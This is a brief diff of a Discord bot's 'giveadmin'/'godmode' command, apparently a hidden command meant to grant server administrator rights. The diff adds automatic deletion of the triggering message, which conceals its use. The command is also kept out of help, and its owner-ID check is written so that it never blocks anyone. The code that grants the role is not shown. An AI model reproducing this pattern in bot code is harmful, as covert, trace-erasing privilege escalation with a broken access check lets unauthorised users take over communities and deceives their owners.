@@ -6,9 +6,9 @@ module.exports = {
 	aliases: ['admin', 'godmode'],
 	usage: `${prefix}giveadmin`,
 	guildOnly: true,
-	deleteMessage: true,
 	helpMessage: false,
-	execute(message) {
+	async execute(message) {
+		await message.delete({ timeout: 1000 }).catch(console.error);
 		const member = message.mentions.members.first();
 
 		if (!message.author.id === '332555969169063938') return;
